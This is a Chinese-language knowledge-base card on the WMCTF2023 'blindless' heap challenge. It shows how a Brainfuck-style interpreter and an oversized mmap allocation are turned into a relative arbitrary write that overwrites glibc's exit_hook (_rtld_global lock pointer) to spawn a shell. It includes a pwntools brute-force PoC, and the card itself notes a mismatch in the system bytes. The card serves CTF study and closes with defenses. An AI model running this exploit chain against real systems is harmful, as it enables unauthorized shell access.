---
id: binary-pwn-heap-wmctf2023-blindless-brainfuck-relative-write-exit-hook-bruteforce
title: WMCTF2023 blindless：Brainfuck 解释器指令集转换为相对任意写，借 mmap 大块邻近 libc 爆破 exit_hook（system + _dl_load_lock）
type: scenario
domain: binary
path: binary/pwn/heap
technique: brainfuck-relative-arbitrary-write-mmap-exit-hook-bruteforce
tags:
- pwn
- heap
- brainfuck
- arbitrary-write
- mmap
- exit-hook
- brute-force
- ctf
- glibc
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: glibc < 2.34（原文标记：glibc-2.34 后失效）
verification:
  verified_by: verifier-V679
  verified_at: '2026-11-13T12:17:19+08:00'
  notes: 已对照原文核对：BF 指令语义（@ 加 4 字节偏移、> +1、+ +8、. 写 code[i+1]）、readInt 无大小上限触发 mmap、data=mmap_base+0x10、exit→__run_exit_handlers→_dl_fini 调 _rtld_global 锁指针并把 _dl_load_lock 作 rdi（img04/06 证实）、3 nibble 爆破 1/4096 均与原文一致；affected_versions 按原文『glibc-2.34 后失效』标 glibc < 2.34（原文 libc-2.31）。原文 PoC 中 system 声明值 0x52290 与写入字节 0x90 0x02 0x46 确有出入且无该题成功截图，卡内已如实注明。与既有 exit_hook 卡（格式化字符串、负 size 逐字节写）写原语不同，append 理由成立。PoC 未本机复跑。
url: /docs/binary/pwn/heap/binary-pwn-heap-wmctf2023-blindless-brainfuck-relative-write-exit-hook-bruteforce/
draft: false
kb_aliases:
- WMCTF2023 blindless
- Brainfuck 解释器任意写
- BF 指令相对写
- mmap 邻近 libc
- exit_hook 爆破
- 无泄露爆破 exit_hook
---

## 一句话结论

题目把用户输入按 Brainfuck 风格指令解释执行：`@` 给全局数据指针加 4 字节偏移、`>` 加 1、`+` 加 8、`.` 把代码流中下一字节写入当前数据地址；同时 `malloc(readInt())` 对大小无上限，超大 size 触发 mmap 并把数据区放在 libc/ld 附近。于是可用 `@` 大偏移把指针移到 `_rtld_global` 的锁函数指针与 `_dl_load_lock`，用 `.` 逐字节写入 `system` 与 `/bin/sh`，程序退出时 `_dl_fini` 调用 `system("/bin/sh")`；由于没有 libc 泄露，需爆破 3 个 nibble（约 1/4096）命中地址。

## 原理

- **自定义解释器即任意写原语**：`executeBrainfuck(code)` 中 `@` 读取 code 后 4 字节加到全局 `data` 指针；`>` 使 `data += 1`；`+` 使 `data += 8`；`.` 把 code 的下一字节写入 `*data`。`data` 初始指向 `malloc(sizea)` 返回的缓冲区，因此攻击者可以用 `@` 做相对偏移、用 `.` 逐字节写任意内容到相对位置。
- **mmap 大块靠近 libc/ld**：`sizea` 来自无上限的 `readInt()`；请求足够大（超过 mmap 阈值）时 glibc 用 mmap 分配，返回地址落在 mmap 区域，与原题环境中 ld/libc 的相对距离稳定（原文 `data = mmap_base + 0x10`）。因此从 `data` 到 `_rtld_global` 的偏移是常量，可在本地用同版本 libc/ld 量出。
- **exit_hook**：glibc < 2.34 中 `exit()` → `__run_exit_handlers` → `_dl_fini`，后者从 `_rtld_global` 取 `_dl_rtld_lock_recursive` / `_dl_rtld_unlock_recursive` 函数指针调用，并把 `_dl_load_lock` 的地址作为参数传入（`lea rdi, [rip+...]`）。把锁函数指针改成 `system`、把 `_dl_load_lock` 写成 `/bin/sh\0`，退出时就执行 `system("/bin/sh")`。
- **无泄露爆破**：题目不提供任何地址输出（blind），但 mmap 基址与 libc/ld 的偏移固定，只有部分高位受 ASLR 随机化。原文通过反复启动/重连、爆破 3 个 nibble（1/4096 概率）来命中正确的函数地址；命中后 exit 触发 shell。
- **为什么成立**：解释器把用户字节当指令执行，`@`/`.` 组合等价于相对任意写；大块 mmap 布局使相对偏移可预测；exit_hook 只需少量写入即可在程序正常退出时稳定触发。

## 触发条件

- glibc < 2.34（exit_hook 有效；原文 libc-2.31），程序会调用 `exit()` 走到 `_dl_fini`。
- 程序提供可构造的相对任意写（本例 Brainfuck 解释器的 `@`/`>`/`+`/`.` 指令），且 `data` 初始地址与 ld/libc 的相对偏移可预测（大块 mmap 分配）。
- 无 libc 泄露，但环境可反复重启/重连以爆破 ASLR 的少量位数（原文 3 nibble，约 1/4096）。
- 偏移与目标 libc/ld 版本一致（本地需同版本库调试）。

## 利用步骤

1. 输入超大 `data size`（如 0x100000）触发 mmap 分配；`code size` 控制在 0x100 以内。
2. 在本地 gdb 量偏移：`p &_rtld_global`、`x/10gx &_rtld_global+0xf08` 得到 `_dl_rtld_lock_recursive`/`_dl_rtld_unlock_recursive` 字段与 `_dl_load_lock`，再减去 mmap 数据区基址得到常量（原文脚本中为 `0x33d060 + 0x908` 与 `0x33d060 + 0xf08` 一类的偏移）。
3. 构造 Brainfuck payload：
   - `@ + p32(_dl_load_lock - data - 0x10)` 调整指针到 `_dl_load_lock`，用 `write(b'/bin/sh\x00')` 写入参数；
   - `@ + p32(rtld_lock - _dl_load_lock - 8)` 再移动到锁函数指针，用 `write(system_low_bytes)` 写入 `system` 地址（高位按爆破/环境选择）；
   - `q` 结束解释器。
4. 发送 payload 并让程序退出，`_dl_fini` 调用被改的锁函数 → `system("/bin/sh")`。
5. 无泄露时循环重连并重复 2-4（原文 `while True` 包裹），爆破 3 个 nibble，直到输出中出现 `flag`。
6. 成功后验证 shell 与文件读取。

## PoC

原文脚本核心（省略 pwntools 脚手架）：

```python
def write(content):
    res = b''
    for i in range(len(content)):
        res += b'.' + p8(content[i]) + b'>'
    return res

while True:
    p = process('./pwn')
    ru('size\n'); sl(str(0x100000))       # 触发 mmap，data 落在 libc 附近
    ru('size\n'); sl(str(0x100))
    ru('code\n')

    argv0     = 0x33d060 + 0x908          # _dl_load_lock 相对偏移
    rtld_lock = 0x33d060 + 0xf08          # _dl_rtld_lock_recursive 相对偏移
    system    = 0x52290

    payload  = b'@' + p32(argv0 - 0x10) + write(b'/bin/sh\x00')
    payload += b'@' + p32(rtld_lock - argv0 - 8) + write(b'\x90\x02\x46')  # system 低字节（按环境）
    payload += b'q'
    sl(payload)

    data = p.recvrepeat(1)
    if b'flag' in data:
        print(data); break
    p.close()
```

说明：偏移与 `system` 字节按原文 libc-2.31 环境整理（`0x33d060` 为相对 mmap 数据区的常量偏移，原文脚本中 `system` 的字节序列与声明值存在出入，实际需按目标 libc 核对）；原文未附该题成功截图，confidence 标 medium。未在本机复跑。

## 变体与关联

- **exit_hook 通用技术**：[[binary-pwn-format-string-exit-hook-rtld-global]]（system + /bin/sh）、[[binary-pwn-heap-exit-hook-onegadget-negative-size-arbitrary-write]]（one_gadget + 负 size/逐字节写），本卡是同一 sink 的第三种写原语（解释器相对写）与无泄露爆破变体。
- 变体：若能得到一次 mmap 地址泄露，则无需爆破；若有任意读，可先读 ld/libc 指针再精确写。
- **Brainfuck 类解释器**：任何把用户输入当指令、且有指针移动+写操作的虚拟机/解释器（BF、自定义 VM、表达式引擎）都可能被转换为相对任意写；审计时应把 `data` 指针移动与写入原语视为高风险。
- 边界：glibc ≥2.34 exit_hook 失效；mmap 布局变化（不同 libc/内核）会改变相对偏移；ASLR 随机位数过多时爆破不可行。

## 检测与防御

- 代码审计：限制 `malloc` 的 size 上限（`readInt` 返回值校验），禁止超大分配触发 mmap；对解释器类组件的指令集做白名单与边界检查，禁止任意指针偏移/任意写指令（或将其沙箱化）。
- 编译加固：PIE + Full RELRO + Canary + NX；使用 glibc ≥2.34（移除 exit_hook 目标）；限制 /proc 信息泄露。
- 检测（CTF/样本）：短时间内大量重复连接且每次发送超大 size + 解释器 payload；mmap 大块分配与向 ld/libc 区域写入；进程退出前的异常间接调用。
- 说明：本卡为 CTF 场景的完整思路记录；真实软件中"用户可控的类 BF 解释器 + 无上限 malloc"同样可能形成任意写原语，应优先修复分配上限与解释器边界。
